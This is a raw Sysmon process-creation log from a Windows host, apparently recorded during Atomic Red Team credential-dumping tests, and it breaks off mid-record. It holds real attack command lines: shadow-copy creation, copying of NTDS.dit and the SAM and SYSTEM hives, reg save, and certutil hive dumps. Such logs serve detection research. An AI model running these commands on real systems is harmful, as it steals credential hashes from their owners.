<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:52:42.958354700Z'/><EventRecordID>1814</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:52:42.957</Data><Data Name='ProcessGuid'>{506a9d8f-7b6a-6908-6f07-000000007003}</Data><Data Name='ProcessId'>3100</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd.exe" /c vssadmin.exe create shadow /for=C: &amp; mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-7b61-6908-0dc1-5b0000000000}</Data><Data Name='LogonId'>0x5bc10d</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-7b63-6908-4a07-000000007003}</Data><Data Name='ParentProcessId'>1068</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:52:38.142524600Z'/><EventRecordID>1795</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:52:38.141</Data><Data Name='ProcessGuid'>{506a9d8f-7b66-6908-5607-000000007003}</Data><Data Name='ProcessId'>1984</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd.exe" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit &amp; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE &amp; reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-7b61-6908-0dc1-5b0000000000}</Data><Data Name='LogonId'>0x5bc10d</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-7b63-6908-4a07-000000007003}</Data><Data Name='ParentProcessId'>1068</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:52:32.109848800Z'/><EventRecordID>1748</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:52:32.108</Data><Data Name='ProcessGuid'>{506a9d8f-7b60-6908-2a07-000000007003}</Data><Data Name='ProcessId'>4228</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1) </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-7b5c-6908-9d11-5b0000000000}</Data><Data Name='LogonId'>0x5b119d</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-7b5d-6908-0e07-000000007003}</Data><Data Name='ParentProcessId'>1656</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:52:32.065719700Z'/><EventRecordID>1746</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:52:32.064</Data><Data Name='ProcessGuid'>{506a9d8f-7b60-6908-2707-000000007003}</Data><Data Name='ProcessId'>4180</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c if not exist \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 (exit /b 1) </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-7b5c-6908-9d11-5b0000000000}</Data><Data Name='LogonId'>0x5b119d</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-7b5d-6908-0e07-000000007003}</Data><Data Name='ParentProcessId'>1656</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAzACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:45.195750600Z'/><EventRecordID>1627</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:45.194</Data><Data Name='ProcessGuid'>{506a9d8f-798d-6908-c306-000000007003}</Data><Data Name='ProcessId'>3340</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"powershell.exe" &amp; {1..10 | %% { 
 try { [System.IO.File]::Copy(\""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"" , \""$env:TEMP\SAMvss$_\"", \""true\"") } catch {}
 ls \""$env:TEMP\SAMvss$_\"" -ErrorAction Ignore
}}</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{506a9d8f-7980-6908-9306-000000007003}</Data><Data Name='ParentProcessId'>3528</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:45.005822500Z'/><EventRecordID>1626</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:45.004</Data><Data Name='ProcessGuid'>{506a9d8f-798d-6908-c206-000000007003}</Data><Data Name='ProcessId'>4848</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss10 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.968184600Z'/><EventRecordID>1625</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.967</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-c106-000000007003}</Data><Data Name='ProcessId'>4812</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss9 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.917991200Z'/><EventRecordID>1624</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.916</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-c006-000000007003}</Data><Data Name='ProcessId'>3132</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss8 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.865375800Z'/><EventRecordID>1623</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.864</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-bf06-000000007003}</Data><Data Name='ProcessId'>1588</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss7 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.821118300Z'/><EventRecordID>1622</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.820</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-be06-000000007003}</Data><Data Name='ProcessId'>3584</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss6 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data 